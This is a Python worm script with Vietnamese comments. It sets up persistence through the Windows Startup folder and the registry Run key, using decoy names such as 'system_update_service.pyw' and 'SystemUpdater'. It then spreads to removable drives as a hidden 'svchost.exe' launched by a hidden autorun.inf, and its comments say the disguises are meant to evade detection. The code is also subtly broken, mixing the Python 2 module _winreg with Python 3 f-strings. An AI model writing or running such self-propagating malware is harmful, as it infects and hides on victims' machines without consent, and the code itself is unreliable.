# filename: self_replication.py
import os
import shutil
import sys
import _winreg # Chỉ dùng cho Windows

def get_script_path():
    """Lấy đường dẫn tuyệt đối của script hiện tại."""
    return os.path.abspath(sys.argv[0])

def replicate_to_startup():
    """Sao chép script vào thư mục Startup để tự khởi động."""
    startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
    current_script_path = get_script_path()
    
    # Đổi tên file để tránh bị nhận diện dễ dàng
    new_script_name = "system_update_service.pyw" # .pyw để chạy ngầm không hiện cửa sổ console
    destination_path = os.path.join(startup_folder, new_script_name)

    if not os.path.exists(destination_path):
        try:
            shutil.copy(current_script_path, destination_path)
            print(f"[*] Đã sao chép vào Startup: {destination_path}")
        except Exception as e:
            print(f"[-] Lỗi khi sao chép vào Startup: {e}")

def add_to_registry_run():
    """Thêm vào khóa Run của Registry để duy trì hoạt động."""
    current_script_path = get_script_path()
    try:
        key = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, _winreg.KEY_SET_VALUE)
        _winreg.SetValueEx(key, "SystemUpdater", 0, _winreg.REG_SZ, f"pythonw.exe \"{current_script_path}\"")
        _winreg.CloseKey(key)
        print("[*] Đã thêm vào Registry Run.")
    except Exception as e:
        print(f"[-] Lỗi khi thêm vào Registry: {e}")

def replicate_to_removable_drives():
    """Sao chép script vào các ổ đĩa di động."""
    current_script_path = get_script_path()
    for drive in "ABCDEFGHIJKLMNOPQRSTUVWXYZ":
        drive_path = f"{drive}:\\"
        if os.path.exists(drive_path) and os.path.ismount(drive_path) and drive_path != os.path.splitdrive(current_script_path)[0] + "\\":
            try:
                # Tạo một thư mục ẩn để chứa bản sao
                target_dir = os.path.join(drive_path, "SystemVolumeInformation") # Tên thư mục hệ thống quen thuộc
                os.makedirs(target_dir, exist_ok=True)
                # Đặt thuộc tính ẩn cho thư mục
                os.system(f'attrib +h "{target_dir}"')

                new_script_name = "svchost.exe" # Đổi tên thành file hệ thống
                destination_path = os.path.join(target_dir, new_script_name)
                
                # Tạo file .lnk để tự khởi chạy khi ổ đĩa được mở
                lnk_path = os.path.join(drive_path, "autorun.inf")
                with open(lnk_path, "w") as f:
                    f.write("[autorun]\n")
                    f.write(f"open={os.path.basename(target_dir)}\\{new_script_name}\n")
                    f.write(f"shell\\open\\command={os.path.basename(target_dir)}\\{new_script_name}\n")
                    f.write("action=Open device to view files\n")
                    f.write("label=My Portable Drive\n")
                
                # Đặt thuộc tính ẩn và hệ thống cho autorun.inf
                os.system(f'attrib +h +s "{lnk_path}"')

                shutil.copy(current_script_path, destination_path)
                print(f"[*] Đã sao chép vào ổ đĩa {drive}:\\: {destination_path}")
            except Exception as e:
                print(f"[-] Lỗi khi sao chép vào ổ đĩa {drive}:\\: {e}")

if __name__ == "__main__":
    replicate_to_startup()
    add_to_registry_run()
    replicate_to_removable_drives()
